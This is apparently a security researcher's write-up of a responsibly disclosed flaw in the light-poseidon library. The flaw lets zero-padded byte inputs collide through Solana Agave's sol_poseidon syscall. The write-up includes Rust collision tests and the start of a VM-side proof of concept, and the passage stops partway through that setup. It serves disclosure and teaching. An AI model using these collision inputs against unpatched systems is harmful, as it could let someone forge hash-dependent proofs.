@@ -1,0 +1,483 @@
+
+<p>Ayooo, who said “battle-tested” crypto integrations and deeply embedded cryptographic primitives are safe?<!-- notionvc: ef6e4b63-270b-4a2c-bf70-86ff5246a61b --></p> 
+<img alt="" height="425" loading="lazy" src="image-01.png" width="587"/> 
+<h2 id="section-1">Introduction<!-- notionvc: 3cfd641b-dfbf-4c85-beba-c366634973e4 --></h2> 
+<p>As CTF players and security researchers, we spend most of our time digging into low-level systems things just to “see how it works”, (this is our love langage with technology I guess). And thanks to CTFs, this gave us xp dealing with custom or slightly twisted implementations, which often behave differently from what you’d expect (as we’ll see :winkwink:).</p>
+<p>In this write-up, we’ll walk through how an old CTF pattern led to identifying a vulnerability in a Solana syscall.</p>
+<p><!-- notionvc: 3f7231c0-d255-4579-a857-2366d9a436f8 --></p>
+<p><em>The vulnerability that i’m gonna describe was responsibly disclosed according to <u><a href="https://github.com/anza-xyz/agave/security" rel="noopener" target="_blank">Solana’s Security Policy</a> </u>in January 2025 and we’ve permission from Anza to publish those information.</em></p> 
+<h2 id="section-2">Context<!-- notionvc: f97af680-6dd3-4d83-8a51-002c315049bb --></h2> 
+<p>Before diving into the actual story, we need to put the cast on the table (it will be easier to understand the ins and outs).</p><p><!-- notionvc: 84540fb0-201a-4069-b28d-b812e417b9c0 --></p><p>First of all, what’s the shape of the Solana environnement that we need to know?</p> 
+<h2 id="section-3">Solana’s environnement<!-- notionvc: 60234d62-5e10-4b7f-8162-229ec4a09f87 --></h2> 
+<p><strong>Agave</strong></p><p><a href="https://github.com/anza-xyz/agave" rel="noopener" target="_blank">Agave</a> is the validator client maintained by <a href="https://github.com/anza-xyz" rel="noopener" target="_blank">Anza</a>. More concretely, it’s a fork of the <a href="https://github.com/solana-labs/solana" rel="noopener" target="_blank"><u>original Solana</u></a> validator codebase, and one of the client implementations that actually executes Solana’s rules in practice. So when we talk about behavior “in Agave”, we’re talking about validator-side execution logic, runtime behavior, loaders, builtins, and all the machinery that processes transactions.</p><p><strong>SVM</strong></p><p>The SVM, or Solana Virtual Machine, is the execution layer. It’s the part responsible for taking transactions and instructions, preparing the execution context, loading the relevant accounts, resolving the target program, metering compute <em>(the “gas” computation if you’re from ethereum)</em>, running the program, and returning the result.</p><p><i>This distinction is useful because “SVM” is often used as a giant bucket term (sometimes wrongly used), which is nice for marketing but terrible for technical reasoning. Networking, consensus, execution, account loading, program invocation: these are different layers, and here the layer we care about in the validator is the execution.</i></p><p><i><a href="https://www.helius.dev/blog/solana-virtual-machine" rel="noopener" target="_blank"><u>Here</u></a> a beautiful article from Helius explaining in depth what’s the SVM.</i></p><p><strong>sBPF</strong></p><p>Solana programs aren’t executed as native machine code directly. They are compiled through LLVM into ELF binaries containing sBPF, <a href="https://github.com/anza-xyz/sbpf" rel="noopener" target="_blank"><u>Solana’s custom variant of eBPF bytecode</u></a>. Those binaries live in executable program accounts, and when invoked, the runtime loads them into a VM with its own stack, heap, memory regions, and compute metering rules.</p><p>So when people say “a program runs on Solana”, the less hand-wavy version is: the validator loads executable sBPF bytecode, builds the VM context, serializes account data into the expected layout, executes the bytecode, and then writes back the allowed state changes.</p><p><i><a href="https://secret.club/2022/05/11/fuzzing-solana.html" rel="noopener" target="_blank"><u>Here</u></a> a great article (in <a href="https://secret.club/2022/05/11/fuzzing-solana-2.html" rel="noopener" target="_blank"><u>2 part</u></a>) about sbpf vulns from Addison and refined <a href="https://www.zellic.io/blog/solana-sbpf/" rel="noopener" target="_blank"><u>here</u></a> by Zellic. (You may learn few things by reading them).</i></p><p><strong>What a syscall actually is here</strong></p><p>Inside that sandbox, a program can’t just reach out and do whatever it wants. Some capabilities are exposed by the runtime through syscalls. Solana’s syscall surface includes things like logging, hashing, cryptographic helpers, CPI, sysvars, and memory operations (<a href="https://github.com/solana-foundation/solana-com/blob/main/apps/docs/content/docs/en/core/programs/syscall-reference.mdx" rel="noopener" target="_blank">list of syscalls</a>), with each call consuming compute units from the transaction budget. So, a syscall is just the VM-approved bridge between the program and runtime-provided native functionality. The program stays in its sandbox, and whenever it needs a service the VM doesn’t provide directly, it asks the runtime to perform it through that interface.</p><p><strong>The whole picture</strong></p><p><!-- notionvc: efd5ab6e-52ec-4cc8-ba2c-7cbdf2e6997a --></p><p>Thus, at a high level, the flow is simple: a Solana program is compiled to sBPF, executed by the SVM, inside a validator client such as Agave. When that program needs functionality that isn’t implemented directly inside the VM it interacts with the runtime through syscalls:</p> 
+<img alt="" height="637" loading="lazy" src="image-02.png" width="1024"/> 
+<h2 id="section-4">The beginning<!-- notionvc: 6d235f86-725e-47ba-8732-ac5d2596b60f --></h2> 
+<p>Now, place to the story.</p><p>A fellow team member from FuzzingLabs, basically dropped “Hey Dim’, it might be interesting for you to check this Solana validator source there are some crypto toys like poseidon inside” in my lap, so I did the healthy thing and disappeared into Agave/Poseidon flow for the next forty-ish minutes.</p><p><!-- notionvc: f5d9a3d7-2366-46c1-8dd9-cc07af929474 --></p><p>While tracing the Poseidon path, one detail immediately made me raise an eyebrow: Agave’s own execution-budget code explicitly references <code><span>light-poseidon</span></code> benchmarks for the syscall cost model, and Solana’s codebase also pulls <code>light-poseidon</code> in as a dependency.</p> 
+<img alt="" height="335" loading="lazy" src="image-03.png" width="1024"/> 
+<p>And from <a data-token-index="0" href="https://github.com/anza-xyz/agave/blob/v2.0.22/compute-budget/src/compute_budget.rs#L194-L222" rel="noopener noreferrer" target="_blank"><span>https://github.com/anza-xyz/agave/blob/v2.0.22/compute-budget/src/compute_budget.rs#L194-L222</span></a>:</p><p><!-- notionvc: 97d130f7-c1bd-4ab3-83d6-432c25110124 --></p> <pre data-filename="execution_budget.rs" data-language="rust"><code>impl SVMTransactionExecutionCost {
+    /// Returns cost of the Poseidon hash function for the given number of
+    /// inputs is determined by the following quadratic function:
+    ///
+    /// 61*n^2 + 542
+    ///
+    /// Which approximates the results of benchmarks of light-posiedon
+    /// library[0]. These results assume 1 CU per 33 ns. Examples:
+    ///
+    /// * 1 input
+    ///   * light-poseidon benchmark: `18,303 / 33 ≈ 555`
+    ///   * function: `61*1^2 + 542 = 603`
+    /// * 2 inputs
+    ///   * light-poseidon benchmark: `25,866 / 33 ≈ 784`
+    ///   * function: `61*2^2 + 542 = 786`
+    /// * 3 inputs
+    ///   * light-poseidon benchmark: `37,549 / 33 ≈ 1,138`
+    ///   * function; `61*3^2 + 542 = 1091`
+    ///
+    /// [0] https://github.com/Lightprotocol/light-poseidon#performance
+    pub fn poseidon_cost(&amp;self, nr_inputs: u64) -&gt; Option {
+        let squared_inputs = nr_inputs.checked_pow(2)?;
+        let mul_result = self
+            .poseidon_cost_coefficient_a
+            .checked_mul(squared_inputs)?;
+        let final_result = mul_result.checked_add(self.poseidon_cost_coefficient_c)?;
+
+        Some(final_result)
+    }
+}</code></pre>
+<p>Then came the <span data-token-index="1">scientific </span>follow-up thought: <!-- notionvc: 9f5f3505-d812-4c19-8118-c4409b2eb96a --></p><p><!-- notionvc: 97d130f7-c1bd-4ab3-83d6-432c25110124 --></p> 
+<img alt="" height="499" loading="lazy" src="image-04.png" width="888"/> 
+<p>The repo itself is pretty small publicly, (just a dozens of GitHub stars at the time of writing), and it ships an <code>audit.pdf </code>in-tree, which is never a bad sign to inspect before trusting anything with “cryptographic primitive” energy.</p> 
+<img alt="" height="359" loading="lazy" src="image-05.png" width="1024"/> 
+<p><em>Important: I’m not trying to dunk on the library here; a small repo clearly doesn’t mean broken.</em></p><p>But at this point there were some hints, the component sits on a sensitive path, looks relatively niche, and appears to have only limited public audit coverage, with only one report publicly visible at that point and that report already containing some pretty critical findings <em>(of course they were patched, but still..)</em>. That is more than enough to justify a serious review instead of giving it the usual “battle-tested” vibes.</p><p><!-- notionvc: 76493870-41af-42e3-bbc5-1770654e9810 --></p><p>Soooooo, let’s dig it 😀</p> 
+<h2 id="section-5">So where does <span><span>light-poseidon</span></span><span> </span>actually sit inside Agave?<!-- notionvc: 74cf61c5-3d12-4d1d-9d59-2bcc23a9cc38 --></h2> 
+<p>Before checkin’ who’s <code>light-poseidon</code> , we should verify how it’s used in Agave so we know our entrypoint and the potential attack surface.</p><p><em>I typically follow a questioning approach when an exploitation primitive is found, and for example here: we’re starting from simply knowing that “light-poseidon” is used, to expanding toward understanding <strong>where</strong>, <strong>when</strong>, and <strong>how</strong> it is applied.</em></p><p>So yay, at first, all I really knew was that <code>poseidon</code> showed up in Agave, and one grep later it was already clear this wasn’t just some random dependency sitting in <code><span>Cargo.lock </span></code>for decoration. The interesting part was figuring out whether <code>light-poseidon</code> was only nearby, or whether it was actually on the execution path.</p><p><!-- notionvc: 7299b532-d76e-459b-9312-e225f322480d --></p><p>The first useful stop is the runtime plumbing. In <code><span><a href="https://github.com/anza-xyz/agave/blob/v2.0.22/programs/bpf_loader/src/syscalls/mod.rs" rel="noopener" target="_blank"><u>programs/bpf_loader/src/syscalls/mod.rs</u></a></span></code>, the Poseidon syscall is feature-gated, then registered into the SBF runtime under the <code>sol_poseidon</code> symbol. Thus, this is the “when” part: <code>light-poseidon</code> becomes relevant when the Poseidon syscall is enabled and a program actually invokes <code>sol_poseidon</code>.</p> <pre data-language="rust"><code>let enable_poseidon_syscall = feature_set.is_active(&amp;enable_poseidon_syscall::id());
+
+register_feature_gated_function!(
+    result,
+    enable_poseidon_syscall,
+    *b"sol_poseidon",
+    SyscallPoseidon::vm,
+)?;</code></pre>
+<p>That already narrows things down a lot. We aren’t looking at some helper used in a side utility, we’re looking at a real syscall entry wired into the VM runtime.</p><p>Once that symbol is hit, control goes into <code><span>SyscallPoseidon::rust</span></code> , which is the validator-side handler for the syscall.</p><p><!-- notionvc: ee60c63b-fd93-4426-a216-62517ae111bd --></p><p>From there, the path is pretty direct. The handler parses the syscall arguments, works with the translated VM slices, and then forwards the actual hashing work to <code><span>poseidon::hashv(parameters, endianness, inputs.as_slice())</span></code>. In other words, the SBF program doesn’t talk to light-poseidon directly. It talks to Agave’s syscall layer, and that layer delegates the hash computation further down. In <a href="https://github.com/anza-xyz/agave/blob/v2.0.22/programs/bpf_loader/src/syscalls/mod.rs#L1797" rel="noopener" target="_blank"><u>mod.rs</u></a>:</p> <pre data-language="rust"><code>let hash = match poseidon::hashv(parameters, endianness, inputs.as_slice()) {
+    Ok(hash) =&gt; hash,
+    Err(e) =&gt; { /* ...snip... */ }
+};
+
+hash_result.copy_from_slice(&amp;hash.to_bytes());</code></pre>
+<p>So the next question becomes: what does <code><span>poseidon::hashv()</span></code>  actually do?</p><p>In <a href="https://github.com/anza-xyz/agave/blob/v2.0.22/poseidon/src/lib.rs#L215" rel="noopener" target="_blank"><u>poseidon/src/lib.rs</u></a>, the <em>non-Solana branch</em>* of <code><span>hashv()</span></code>  imports <code><span>light_poseidon::{Poseidon, PoseidonBytesHasher, PoseidonError}</span></code> , constructs a hasher with <code><span>Poseidon::&lt;Fr&gt;::new_circom(vals.len())</span></code> , and then hashes the user-provided byte slices through <code><span>hash_bytes_be()</span></code>  or <code><span>hash_bytes_le()</span></code> , depending on the selected endianness. This is the critical “how” part of the path.</p><p>*<em>non-Solana branch: this is the native branch ultimately reached when a program calls </em><code><span><i>sol_poseidon</i></span></code><em> and Agave services that syscall on the host side</em></p> <pre data-language="rust"><code>use light_poseidon::{Poseidon, PoseidonBytesHasher, PoseidonError};
+
+let mut hasher = Poseidon::::new_circom(vals.len())?;
+let res = match endianness {
+    Endianness::BigEndian =&gt; hasher.hash_bytes_be(vals),
+    Endianness::LittleEndian =&gt; hasher.hash_bytes_le(vals),
+}?;</code></pre>
+<p>Agave doesn’t protect itself from light-poseidon’s byte-handling here. It directly relies on <code><span>hash_bytes_be()</span></code>  / <code><span>hash_bytes_le()</span></code>  for the real syscall result, so if those functions accept ambiguous payloads or whatever, the syscall accepts them too.</p> 
+<img alt="" height="499" loading="lazy" src="image-06.png" width="541"/> 
+<p><span data-token-index="0">Full trail summary at this point:</span><!-- notionvc: e9c50a60-6929-40a3-a328-d708496e6eb1 --></p>
+<p><span><code>sol_poseidon</code></span><code> </code>feature-gated in the runtime -&gt; registered to <span><code>SyscallPoseidon::vm </code></span> -&gt; syscall handler forwards to <span><code>poseidon::hashv(…) <br/></code></span>-&gt; <span><code>hashv()</code></span> instantiates light-poseidon and calls <code><span>hash_bytes_be()</span></code><span>  / </span><code><span>hash_bytes_le()</span></code><span> </span></p> 
+<h2 id="section-6">Okay, cool... but what does<!-- notionvc: 83fac1f8-a540-414e-9b55-69732fde4c37 --> <span><span>light-poseidon</span></span><span> </span>actually do with the bytes?<!-- notionvc: 3ac9fb96-1121-4712-a925-351c6e69fc82 --></h2> 
+<p>At that point I stopped reading Agave for a second and opened <code><span>light-poseidon</span></code>  code implementation <em>(the last commit at that moment was: </em><code><span><i>92be0d4</i></span></code><em> )</em>.</p><p>The trait docs already set the expectation. <code><span>PoseidonBytesHasher</span></code> is presented as the “hash bytes” entrypoint, and the safety notes say these helpers are meant to avoid the surprising behavior you can get from looser byte-to-field conversions by enforcing modulus-sized inputs. That is an important promise, because if that promise holds, then the byte encoding layer is supposed to be sane before the sponge even starts. See <a href="https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L258-L308" rel="noopener" target="_blank">https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L258-L308</a>:</p> <pre data-language="rust"><code>// light-poseidon @ 92be0d4
+pub trait PoseidonBytesHasher {
+    
+    /// ... snip ....
+    /// ...(same than hash_bytes_le docs)...
+    fn hash_bytes_be(&amp;mut self, inputs: &amp;[&amp;[u8]]) -&gt; Result;
+    /// Calculates a Poseidon hash for the given input of little-endian byte
+    /// slices and returns the result as a byte array.
+    ///
+    /// # Examples
+    ///
+    /// Example with two simple little-endian byte inputs and BN254-based
+    /// parameters provided by the library.
+    ///
+    /// ```rust
+    /// use light_poseidon::{Poseidon, PoseidonBytesHasher, parameters::bn254_x5};
+    /// use ark_bn254::Fr;
+    /// use ark_ff::{BigInteger, PrimeField};
+    ///
+    /// let mut poseidon = Poseidon::::new_circom(2).unwrap();
+    ///
+    /// let hash = poseidon.hash_bytes_le(&amp;[&amp;[1u8; 32], &amp;[2u8; 32]]).unwrap();
+    ///
+    /// println!("{:?}", hash);
+    /// // Should print:
+    /// // [
+    /// //     144, 25, 130, 41, 200, 53, 231, 38, 27, 206, 162, 156, 254, 132, 123, 32, 25, 99, 242,
+    /// //     85, 3, 94, 235, 125, 28, 140, 138, 143, 147, 225, 84, 13
+    /// // ]
+    /// ```
+    ///
+    /// # Safety
+    ///
+    /// Unlike the
+    /// [`PrimeField::from_le_bytes_mod_order`](ark_ff::PrimeField::from_le_bytes_mod_order)
+    /// and [`Field::from_random_bytes`](ark_ff::Field::from_random_bytes)
+    /// methods, this function ensures that the input byte slice's length exactly matches
+    /// the modulus size of the prime field. If the size doesn't match, an error is returned.
+    ///
+    /// This strict check is designed to prevent unexpected behaviors and collisions
+    /// that might occur when using `from_be_bytes_mod_order` or `from_random_bytes`,
+    /// which simply take a subslice of the input if it's too large, potentially
+    /// leading to collisions.
+    fn hash_bytes_le(&amp;mut self, inputs: &amp;[&amp;[u8]]) -&gt; Result;
+}</code></pre>
+<p>Then let’s jump straight to the <a href="https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L416-L437" rel="noopener" target="_blank">implementation</a>, because this is where things get interesting. The <code><span>hash_bytes_*()</span></code>  methods are generated by a macro, and the control flow is actually very small: first validate each byte slice, then convert each slice into a prime-field element, then call <code>self.hash(&amp;inputs)</code>, and finally serialize the hash result back into bytes:</p> <pre data-language="rust"><code>// light-poseidon @ 92be0d4
+macro_rules! impl_hash_bytes {
+    ($fn_name:ident, $bytes_to_prime_field_element_fn:ident, $to_bytes_fn:ident) =&gt; {
+        fn $fn_name(&amp;mut self, inputs: &amp;[&amp;[u8]]) -&gt; Result {
+            let inputs: Result&lt;Vec, _&gt; = inputs
+                .iter()
+                .map(|input| validate_bytes_length::(input))
+                .collect();
+            let inputs = inputs?;
+            let inputs: Result&lt;Vec, _&gt; = inputs
+                .iter()
+                .map(|input| $bytes_to_prime_field_element_fn(input))
+                .collect();
+            let inputs = inputs?;
+            let hash = self.hash(&amp;inputs)?;
+
+            hash.into_bigint()
+                .$to_bytes_fn()
+                .try_into()
+                .map_err(|_| PoseidonError::VecToArray)
+        }
+    };
+}</code></pre>
+<p>So now, <span data-token-index="5">what exact field elements do these byte slices become before Poseidon sees them?</span></p> 
+<p>Here came the first real “hmmm”, the public docs above talked about exact modulus-sized inputs, but the actual validation code is looser. It rejects empty slices, and it rejects slices <span data-token-index="1"><b>longer</b></span> than the field modulus size in bytes. But it does <b><span data-token-index="3">not</span> </b>require equality. So shorter inputs are perfectly valid. That is already a very different contract from the one you would have in mind if you read the trait docs first, <a data-token-index="0" href="https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L444-L469" rel="noopener noreferrer" target="_blank"><span>https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L444-L469</span></a>:</p> <pre data-language="rust"><code>/// Checks whether a slice of bytes is not empty or its length does not exceed
+/// the modulus size od the prime field. If it does, an error is returned.
+///
+/// # Safety
+///
+/// [`PrimeField::from_be_bytes_mod_order`](ark_ff::PrimeField::from_be_bytes_mod_order)
+/// just takes a subslice of the input if it's too large, potentially leading
+/// to collisions. The purpose of this function is to prevent them by returning
+/// and error. It should be always used before converting byte slices to
+/// prime field elements.
+pub fn validate_bytes_length(input: &amp;[u8]) -&gt; Result
+where
+    F: PrimeField,
+{
+    let modulus_bytes_len = ((F::MODULUS_BIT_SIZE + 7) / 8) as usize;
+    if input.is_empty() {
+        return Err(PoseidonError::EmptyInput);
+    }
+    if input.len() &gt; modulus_bytes_len {
+        return Err(PoseidonError::InvalidInputLength {
+            len: input.len(),
+            modulus_bytes_len,
+        });
+    }
+    Ok(input)
+}</code></pre>
+<p>So let’s go one step further backward, into the conversion itself. After passing that length check, the slice is turned into a <code><span>num_bigint::BigUint </span></code> with either <code><span>from_bytes_be</span></code><code> </code>or <code><span>from_bytes_le</span></code><code> </code>, then converted into <code><span>F::BigInt</span></code> , explicitly checked against <code><span>F::MODULUS</span></code>, and only then turned into an <code><span>ark_ff </span></code> field element with <code><span>F::from_bigint</span></code>. That means the library isn’t preserving “byte string identity” at this stage. It is first interpreting the bytes as an integer, and then as a field element:</p><p><a data-token-index="0" href="https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L471-L495" rel="noopener noreferrer" target="_blank"><span>https://github.com/Lightprotocol/light-poseidon/blob/92be0d45df64796ba5ce5db68c5b5dbc214b7bbd/light-poseidon/src/lib.rs#L471-L495</span></a><!-- notionvc: 88ea42e7-9daf-4864-ac1f-9f3f7803b5c3 --></p> <pre data-language="rust"><code>// light-poseidon @ 92be0d4
+macro_rules! impl_bytes_to_prime_field_element {
+    ($name:ident, $from_bytes_method:ident, $endianess:expr) =&gt; {
+        #[doc = "Converts a slice of "]
+        #[doc = $endianess]
+        #[doc = "-endian bytes into a prime field element, \
+                 represented by the [`ark_ff::PrimeField`](ark_ff::PrimeField) trait."]
+        pub fn $name(input: &amp;[u8]) -&gt; Result
+        where
+            F: PrimeField,
+        {
+            let element = num_bigint::BigUint::$from_bytes_method(input);
+            let element = F::BigInt::try_from(element).map_err(|_| PoseidonError::BytesToBigInt)?;
+
+            // In theory, `F::from_bigint` should also perform a check whether input is
+            // larger than modulus (and return `None` if it is), but it's not reliable...
+            // To be sure, we check it ourselves.
+            if element &gt;= F::MODULUS {
+                return Err(PoseidonError::InputLargerThanModulus);
+            }
+            let element = F::from_bigint(element).ok_or(PoseidonError::InputLargerThanModulus)?;
+
+            Ok(element)
+        }
+    };
+}</code></pre>
+<p>Thus, the real behavior of light-poseidon isn’t “take arbitrary bytes and hash them as bytes.” It is closer to: <span data-token-index="3">accept any non-empty byte slice up to the field byte length, interpret it numerically in the selected endianness, convert that number into a BN254 field element, and only then hash the resulting field elements</span>. </p> 
+<h2 id="section-7">CTF parallel &amp; inspiration<!-- notionvc: edc1fa42-72c0-4ef5-839b-6a0feac266f5 --></h2> 
+<p>I had seen that kind of smell before.</p><p>Back in HTB UniCTF 2022, I solved <strong>AESWCM</strong> through an unintended path where two distinct inputs ended up collapsing to the same plaintext <em>before</em> the downstream crypto logic had any chance to distinguish them. The service prepended <code><span>b”Property: “</span></code> , rejected duplicate raw inputs, and revealed the flag once two different inputs produced the same tag <em>(tag was an AES-CBC-like encryption)</em>.</p><p><!-- notionvc: d8d660b8-0999-4c76-8218-28f26f5a9029 --></p><p>A part of the unintended bug was here: padding was only applied when the length was <strong>not</strong> already a multiple of the block size.</p> <pre data-language="python"><code>def pad(self,pt):
+	if len(pt)%self.BLOCK_SIZE!=0:
+		pt=pad(pt,self.BLOCK_SIZE)
+	return pt</code></pre>
+<p>That meant one input could be implicitly padded into a value that another input already represented explicitly. In practice, these <span data-token-index="1"><b>two different inputs</b></span> normalized <b><span data-token-index="3">to</span> </b>the exact <span data-token-index="5"><b>same plaintext</b></span>, right before the encryption and just after the unicity check:<!-- notionvc: 222d9496-6a1f-4cde-9a3a-4a9d9f631ee5 --></p> <pre data-language="pycon"><code>&gt;&gt;&gt; pad(b'Property: ' + b'')
+b'Property:\x06\x06\x06\x06\x06\x06'
+&gt;&gt;&gt; pad(b'Property: ' + b'\x06\x06\x06\x06\x06\x06')
+b'Property:\x06\x06\x06\x06\x06\x06'</code></pre>
+<p>That old pattern is what came back to mind here. Not because the bug was the same, but because the shape was the same: if distinct byte encodings are allowed to collapse right <span data-token-index="1">before</span> the cryptographic function runs then it’s already too late.<!-- notionvc: b18fdb77-c797-4e44-b3de-3369352dfaa3 --><!-- notionvc: 222d9496-6a1f-4cde-9a3a-4a9d9f631ee5 --></p> 
+<h2 id="section-8">Back to our beloved <span>light-poseidon</span></h2> 
+<p>Once you read it with that mental model, the collision shape is hard to miss. Since shorter inputs are allowed, and since the conversion is numeric, redundant zero padding is not preserved as distinct input structure. For big-endian, you can reason about “01”, “0001”, and “000001” as different byte strings that all represent the same integer value 1. For little-endian, the same thing happens with trailing zero bytes: “01”, “0100”, and “010000”  still encode 1. That isn’t the Poseidon permutation doing anything exotic. That collapse happens earlier, at the byte-to-integer layer. This is an inference from the accepted-length check plus the <code><span>BigUint::from_bytes_be </span></code>/<code><span> from_bytes_le </span></code>conversion model.</p><p>And by the time execution reaches <code><span>self.hash(&amp;inputs)</span></code> , the original byte encoding is already gone. The sponge only receives a slice of field elements, pushes the <code><span>domain_tag</span></code> , appends the inputs, runs the rounds, and returns <code><span>state[0]</span></code> . So if two different byte encodings collapsed into the same field element earlier, <a><u>hash()</u></a> has no way to distinguish them anymore. At that point, the ambiguity is already baked into the input state.</p><p><!-- notionvc: 8d96f416-d77b-4ab8-b7eb-a2c25fe469ec --></p><p>Let’s test it right away with:</p> <pre data-language="rust"><code>#[test]
+fn test_poseidon_bn254_collision_be() {
+    let mut hasher = Poseidon::::new_circom(2).unwrap();
+    let hash = hasher.hash_bytes_be(&amp;[&amp;[0, 0, 0, 1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], &amp;[0, 0, 0, 1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]]).unwrap();
+    let hash2 = hasher.hash_bytes_be(&amp;[&amp;[1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], &amp;[1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]]).unwrap();
+    assert_eq!(hash, hash2);
+}
+
+#[test]
+fn test_poseidon_bn254_collision_le() {
+    let mut hasher = Poseidon::::new_circom(2).unwrap();
+    let hash = hasher.hash_bytes_le(&amp;[&amp;[1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0], &amp;[1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0]]).unwrap();
+    let hash2 = hasher.hash_bytes_le(&amp;[&amp;[1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1], &amp;[1u8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]]).unwrap();
+    assert_eq!(hash, hash2);
+}
+</code></pre>
+<img alt="" height="392" loading="lazy" src="image-07.png" width="1024"/> 
+<p>Eureka!</p> 
+<img alt="" height="418" loading="lazy" src="image-08.png" width="597"/> 
+<h2 id="section-9">Back to Agave: setting up the VM-side PoC properly<!-- notionvc: c860ccfd-1440-4333-9bc3-5b1ff54df636 --></h2> 
+<p>After the crate-level collision, the goal was to come back to the actual Agave implementation and verify the bug through the real syscall path, not just through a direct call into <code><span>light-poseidon</span></code>. <span data-token-index="3">(to prove real reachability from a program-caller perspective)</span>.</p> 
+<h3 id="section-10">What the syscall expects from the VM<!-- notionvc: 3c91f345-96a6-4cd9-ab71-35deb0ebb7af --></h3> 
+<p>The syscall doesn’t receive the input bytes directly. It receives:</p><ul><li>a guest virtual address pointing to an array of slice descriptors</li><li>a guest virtual addresses for the actual backing byte buffers</li><li>a guest virtual address for the output buffer</li><li>a memory mapping that lets Agave translate all of that safely</li></ul><p>So the PoC needs to build the same shape. But it was needed to keep in mind 2 inherent constraints:</p><p><!-- notionvc: 83f47811-b096-42f5-91f4-48d415d77aee --></p><p>The first constraint is layout correctness. Every mapped object must live in a guest region large enough for the accesses the syscall will perform, and those guest ranges must not overlap. That’s why our poc places the descriptor array, output buffer, and backing input slices at separated addresses such as <code>0x100000000</code>, <code>0x200000000</code>, <code>0x300000000</code>, and <code>0x400000000</code>. In sBPF those <code>0x100000000 </code>boundaries are the conventional region split points (normally organized for bytecode, stack, heap, inputs), but here we didn’t need to take care of the normal memory layout since that was just to avoids collisions between objects in guest space and make the mapping easy to read (yep such big gaps allocations was kinda overkill lmao, but it works for the PoC and that’s all we needed).</p><p><em>btw if you want a good read about sbpf memory layout , a recent article (2026) from RareSkill explain it really well <u><a href="https://rareskills.io/post/solana-memory-layout" rel="noopener" target="_blank">here</a>.</u></em></p><p>The second constraint is access permissions. The syscall only reads the descriptor array and input byte buffers, so those regions are mapped with <code><span>MemoryRegion::new_readonly(…)</span></code> . The output buffer is different: the syscall writes the final hash into it, so that region must be mapped with <code><span>MemoryRegion::new_writable(…)</span></code>  . If either the bounds or the permissions are wrong, the test can fail with a VM access violation before reaching the actual hashing path.</p><p><!-- notionvc: 1fd282df-78a4-4c02-af6e-28918226bd68 --></p><p>First, each input slice is represented by a <code><span>MockSlice</span></code>  :</p> <pre data-language="rust"><code>let mock_slice1 = MockSlice {
+    vm_addr: 0x300000000, 
+    len: bytes1.len(),
+};</code></pre>
+<p>This is just the guest-side description of a slice: “the bytes live at this address, and they are this long”.</p><p><!-- notionvc: c66c4bd1-6a8c-468f-95d8-31bb13f0efc1 --></p><p>Then those slice descriptors are themselves placed in guest memory:</p> <pre data-language="rust"><code>MemoryRegion::new_readonly(bytes_of_slice(&amp;vals_1_bytes), vals_1_bytes_va) // vals_1_bytes_va is just the virtual address of where the slice descriptors starts</code></pre>
+<p>And separately, the actual byte arrays are also placed into guest memory at the addresses referenced by those descriptors:<!-- notionvc: 047b09cb-51b0-4e7f-8a1a-506864a4cfb1 --></p> <pre data-language="rust"><code>MemoryRegion::new_readonly(bytes1, vals_1_bytes[0].vm_addr),
+MemoryRegion::new_readonly(bytes2, vals_1_bytes[1].vm_addr),</code></pre>
+<p>Finally, the result buffer must be exposed as writable memory so the syscall can write the hash back:<!-- notionvc: 63f0de0c-71b8-44cc-87cf-ba8f51aa26af --></p> <pre data-language="rust"><code>MemoryRegion::new_writable(bytes_of_slice_mut(&amp;mut result_1_bytes), result_1_bytes_va)</code></pre>
+<h3 id="section-11">Compute budget part of the setup<!-- notionvc: 621e0229-5256-4946-9cb6-d8f9239dad6d --></h3> 
+<p>Oups…I forgot, there is one more hidden constraint.</p><p><!-- notionvc: 490c0bc2-94d1-46ba-affc-cdd3306e2df6 --><!-- notionvc: 047b09cb-51b0-4e7f-8a1a-506864a4cfb1 --></p><p>The syscall charges compute units. So before each invocation, the mock invoke context needs enough remaining budget to cover the Poseidon call:</p> <pre data-language="rust"><code>invoke_context.mock_set_remaining(
+    invoke_context
+        .get_compute_budget()
+        .poseidon_cost(vals_1_bytes.len() as u64)
+        .unwrap(),
+);</code></pre>
